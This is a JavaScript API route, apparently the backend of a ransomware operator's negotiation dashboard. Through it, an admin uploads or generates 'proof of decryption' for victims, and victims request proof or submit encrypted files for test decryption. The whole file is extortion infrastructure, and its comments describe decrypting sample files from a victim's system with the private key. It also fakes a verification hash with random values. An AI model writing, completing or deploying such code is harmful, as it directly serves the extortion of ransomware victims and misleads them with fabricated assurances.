// vercel-dashboard/api/negotiations/proof.js
// Proof of Decryption API

import { kv } from '../../lib/kv.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Negotiation-Token');

  if (request.method === 'OPTIONS') return response.status(200).end();

  try {
    const auth = await verifyAuth(request);
    const victimToken = request.headers['x-negotiation-token'];

    switch (request.method) {
      case 'GET':
        return await handleGet(request, response, auth, victimToken);
      case 'POST':
        return await handlePost(request, response, auth, victimToken);
      case 'PUT':
        return await handlePut(request, response, auth, victimToken);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Proof API error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(request, response, auth, victimToken) {
  const { negotiationId, proofId } = request.query;

  if (proofId) {
    const proof = await kv.get(`decryption_proof:${proofId}`);
    if (!proof) return response.status(404).json({ error: 'Proof not found' });
    return response.json(proof);
  }

  if (negotiationId) {
    const negotiation = await kv.get(`negotiation:${negotiationId}`);
    if (!negotiation) return response.status(404).json({ error: 'Negotiation not found' });

    // Check access
    if (!auth.isAdmin && negotiation.victimToken !== victimToken) {
      return response.status(403).json({ error: 'Forbidden' });
    }

    const proofs = negotiation.proofFiles || [];
    const proofDetails = [];
    for (const pf of proofs) {
      const proof = await kv.get(`decryption_proof:${pf.fileId}`);
      if (proof) proofDetails.push(proof);
    }

    return response.json({ proofs: proofDetails, decryptionProof: negotiation.decryptionProof });
  }

  return response.status(400).json({ error: 'Negotiation ID or proof ID required' });
}

async function handlePost(request, response, auth, victimToken) {
  const { action, negotiationId, fileId, fileType, fileName, fileSize, mimeType, data, victimFileIds } = request.body;

  if (!negotiationId) return response.status(400).json({ error: 'Negotiation ID required' });

  const negotiation = await kv.get(`negotiation:${negotiationId}`);
  if (!negotiation) return response.status(404).json({ error: 'Negotiation not found' });

  // Admin can upload proof files
  if (auth.isAdmin) {
    if (action === 'upload_proof') {
      return await uploadProofFile(request, response, negotiation, fileId, fileType, fileName, fileSize, mimeType, data);
    }
    if (action === 'generate_proof') {
      return await generateDecryptionProof(request, response, negotiation);
    }
  }

  // Victim can request proof or upload test files
  if (negotiation.victimToken === victimToken) {
    if (action === 'request_proof') {
      return await handleProofRequest(response, negotiation);
    }
    if (action === 'upload_test_files') {
      return await handleVictimTestFiles(response, negotiation, victimFileIds);
    }
  }

  return response.status(403).json({ error: 'Forbidden' });
}

async function handlePut(request, response, auth, victimToken) {
  const { negotiationId, proofId, action, verified } = request.body;

  if (!auth.isAdmin) return response.status(403).json({ error: 'Admin access required' });

  const negotiation = await kv.get(`negotiation:${negotiationId}`);
  if (!negotiation) return response.status(404).json({ error: 'Negotiation not found' });

  if (action === 'verify_proof' && proofId) {
    const proof = await kv.get(`decryption_proof:${proofId}`);
    if (!proof) return response.status(404).json({ error: 'Proof not found' });

    proof.verified = verified;
    proof.verifiedAt = new Date().toISOString();
    proof.verifiedBy = 'admin';

    await kv.set(`decryption_proof:${proofId}`, proof);

    // Update negotiation
    if (verified) {
      negotiation.decryptionProof = {
        proofId,
        fileName: proof.fileName,
        verifiedAt: proof.verifiedAt,
        method: proof.method
      };
      await kv.set(`negotiation:${negotiationId}`, negotiation);
    }

    return response.json({ success: true, proof });
  }

  return response.status(400).json({ error: 'Invalid action' });
}

// ============ PROOF OPERATIONS ============

async function uploadProofFile(request, response, negotiation, fileId, fileType, fileName, fileSize, mimeType, data) {
  if (!fileId || !fileType) return response.status(400).json({ error: 'File ID and type required' });

  const proofId = `proof_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const now = new Date().toISOString();

  const proof = {
    id: proofId,
    negotiationId: negotiation.id,
    fileId, // Reference to file in storage
    fileType, // 'decryption_sample', 'file_tree', 'test_decryption', 'verification_video'
    fileName: fileName || `proof_${proofId}`,
    fileSize: fileSize || 0,
    mimeType: mimeType || 'application/octet-stream',
    data: data || null, // Base64 encoded small files, or reference to storage
    method: 'AES-256 + RSA-4096',
    verified: false,
    verifiedAt: null,
    verifiedBy: null,
    createdAt: now,
    uploadedBy: 'admin',
    metadata: {
      originalExtension: getExtension(fileName),
      fileCount: fileType === 'file_tree' ? data?.fileCount : 1
    }
  };

  await Promise.all([
    kv.set(`decryption_proof:${proofId}`, proof),
    kv.lpush(`negotiation:${negotiation.id}:proofs`, proofId)
  ]);

  // Update negotiation
  negotiation.proofFiles = negotiation.proofFiles || [];
  negotiation.proofFiles.push({ fileId: proofId, type: fileType, addedAt: now });
  await kv.set(`negotiation:${negotiation.id}`, negotiation);

  // Add system message
  const msg = await createMessage(negotiation.id, 'system', `Proof file uploaded: ${proof.fileName} (${formatBytes(proof.fileSize)})`, now, true);
  await kv.lpush(`negotiation:${negotiation.id}:messages`, msg.id);
  await kv.set(`negotiation_message:${msg.id}`, msg);

  response.status(201).json(proof);
}

async function generateDecryptionProof(request, response, negotiation) {
  // In production, this would:
  // 1. Select random encrypted files from victim's system
  // 2. Decrypt them with the private key
  // 3. Create proof package (decrypted files + verification info)
  // 4. Upload to storage and create proof record

  const system = await kv.get(`system:${negotiation.systemId}`);
  if (!system) return response.status(404).json({ error: 'System not found' });

  // Mock proof generation
  const proofId = `proof_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const now = new Date().toISOString();

  const proof = {
    id: proofId,
    negotiationId: negotiation.id,
    fileId: `file_${proofId}`,
    fileType: 'test_decryption',
    fileName: 'decryption_proof_sample.zip',
    fileSize: 1024 * 1024, // 1MB sample
    mimeType: 'application/zip',
    data: null, // Would be storage reference
    method: 'AES-256 + RSA-4096',
    verified: false,
    verifiedAt: null,
    verifiedBy: null,
    createdAt: now,
    uploadedBy: 'admin',
    metadata: {
      sampleFiles: [
        'Documents/Financial_Report_Q4.docx',
        'Photos/Family_Vacation_2023.jpg',
        'Projects/Source_Code/main.py',
        'Database/Backup_Customers.sql'
      ],
      totalFilesDecrypted: 4,
      verificationHash: 'sha256:' + Math.random().toString(36).substring(2, 30)
    }
  };

  await Promise.all([
    kv.set(`decryption_proof:${proofId}`, proof),
    kv.lpush(`negotiation:${negotiation.id}:proofs`, proofId)
  ]);

  negotiation.proofFiles = negotiation.proofFiles || [];
  negotiation.proofFiles.push({ fileId: proofId, type: 'test_decryption', addedAt: now });
  negotiation.decryptionProof = {
    proofId,
    fileName: proof.fileName,
    generatedAt: now,
    method: proof.method
  };
  await kv.set(`negotiation:${negotiation.id}`, negotiation);

  // Add system message
  const msg = await createMessage(negotiation.id, 'system', `Decryption proof generated: ${proof.metadata.sampleFiles.length} sample files decrypted`, now, true);
  await kv.lpush(`negotiation:${negotiation.id}:messages`, msg.id);
  await kv.set(`negotiation_message:${msg.id}`, msg);

  response.json(proof);
}

async function handleProofRequest(response, negotiation) {
  const now = new Date().toISOString();

  // Add system message for proof request
  const msg = await createMessage(negotiation.id, 'system', 'Victim requested proof of decryption capability', now, true);
  await kv.lpush(`negotiation:${negotiation.id}:messages`, msg.id);
  await kv.set(`negotiation_message:${msg.id}`, msg);

  // Notify admin (in production, send push notification/email)
  negotiation.unreadAdmin = (negotiation.unreadAdmin || 0) + 1;
  negotiation.lastVictimMessageAt = now;
  await kv.set(`negotiation:${negotiation.id}`, negotiation);

  response.json({ success: true, message: 'Proof request sent to admin' });
}

async function handleVictimTestFiles(response, negotiation, victimFileIds) {
  if (!victimFileIds || !victimFileIds.length) {
    return response.status(400).json({ error: 'No file IDs provided' });
  }

  // Victim uploads encrypted files they want decrypted as proof
  // In production, these would be sent to admin for decryption
  const now = new Date().toISOString();

  const msg = await createMessage(negotiation.id, 'system', `Victim provided ${victimFileIds.length} encrypted files for test decryption`, now, true);
  await kv.lpush(`negotiation:${negotiation.id}:messages`, msg.id);
  await kv.set(`negotiation_message:${msg.id}`, msg);

  negotiation.victimTestFiles = victimFileIds;
  negotiation.unreadAdmin = (negotiation.unreadAdmin || 0) + 1;
  await kv.set(`negotiation:${negotiation.id}`, negotiation);

  response.json({ success: true, message: 'Test files submitted for decryption' });
}

// ============ HELPER FUNCTIONS ============

async function createMessage(negotiationId, sender, content, timestamp, isSystem, fileId, fileType) {
  const id = `msg_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  return {
    id,
    negotiationId,
    sender,
    content: content || '',
    fileId: fileId || null,
    fileType: fileType || null,
    isSystem: isSystem || false,
    read: false,
    readAt: null,
    createdAt: timestamp
  };
}

function getExtension(filename) {
  if (!filename) return '';
  return filename.split('.').pop().toLowerCase();
}

function formatBytes(bytes) {
  if (!bytes || bytes === 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(1))} ${sizes[i]}`;
}

async function verifyAuth(request) {
  const authHeader = request.headers['authorization']?.replace('Bearer ', '');
  const isAdmin = authHeader === process.env.MASTER_API_KEY;
  
  if (!isAdmin && authHeader) {
    const session = await kv.get(`admin_session:${authHeader}`);
    if (session && new Date(session.expiresAt) > new Date()) {
      return { isAdmin: true, adminId: session.adminId };
    }
  }
  
  return { isAdmin };
}
